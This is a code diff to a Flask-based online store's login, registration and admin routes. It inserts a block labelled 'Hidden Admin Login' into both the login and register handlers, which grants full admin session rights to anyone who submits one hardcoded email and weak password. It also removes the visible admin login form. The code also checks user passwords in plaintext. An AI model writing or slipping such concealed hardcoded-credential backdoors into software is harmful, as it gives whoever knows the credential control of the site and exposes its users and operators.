@@ -71,8 +71,15 @@ def login():
         if maintenance:
             return render_template("login.html", error="Store is currently under Maintenance. Please try again later.")
             
+        
         email = request.form.get("email")
         password = request.form.get("password")
+        
+        # Hidden Admin Login
+        if email == "admin@karan.com" and password == "karan123":
+            session["admin"] = True
+            return redirect("/admin/panel")
+
         
         user = db.users.find_one({"email": email, "password": password})
         if user:
@@ -96,8 +103,15 @@ def register():
             return render_template("register.html", error="Store is currently under Maintenance.")
             
         username = request.form.get("username")
+        
         email = request.form.get("email")
         password = request.form.get("password")
+        
+        # Hidden Admin Login
+        if email == "admin@karan.com" and password == "karan123":
+            session["admin"] = True
+            return redirect("/admin/panel")
+
         
         if db.users.find_one({"email": email}):
             return render_template("register.html", error="Email is already registered. Please Login.")
@@ -465,17 +479,13 @@ def admin_support_chat(user_id):
     if not ticket: return redirect("/admin/support")
     return render_template("admin/support_chat.html", ticket=ticket)
 
+
 @app.route("/admin", methods=["GET", "POST"])
 def admin_login():
-    if request.method == "POST":
-        username = request.form.get("username")
-        password = request.form.get("password")
-        if username == "admin" and password == "karan123":
-            session["admin"] = True
-            return redirect("/admin/panel")
-        else:
-            return render_template("login.html", error="Invalid Admin Credentials", is_admin=True)
-    return render_template("login.html", is_admin=True)
+    if session.get("admin"):
+        return redirect("/admin/panel")
+    return redirect("/")
+
 
 @app.route("/admin/panel")
 def admin_panel():
